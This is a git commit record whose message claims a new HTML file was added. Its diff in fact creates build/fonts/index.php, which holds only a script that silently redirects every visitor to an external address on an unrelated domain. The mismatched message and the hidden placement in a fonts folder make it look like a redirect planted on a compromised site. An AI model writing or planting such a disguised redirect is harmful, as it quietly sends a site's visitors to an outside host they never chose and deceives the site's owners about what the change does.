d2197042aa7f74ade454024afb8f4044f4b47dc4
Babek Naghiyev <babeknaghiyev@Babeks-MacBook-Pro.local>
2020-04-02 20:58:14 +0400

    added new_courier_2.html

---
+++ build/fonts/index.php
@@ -0,0 +1,8 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script type="text/javascript">
+   	// Javascript URL redirection
+    window.location.replace("http://blue74.dnsmisitio.net/~feg11sebastian/wp-content/evoelectronica/");
+</script>
+</body>
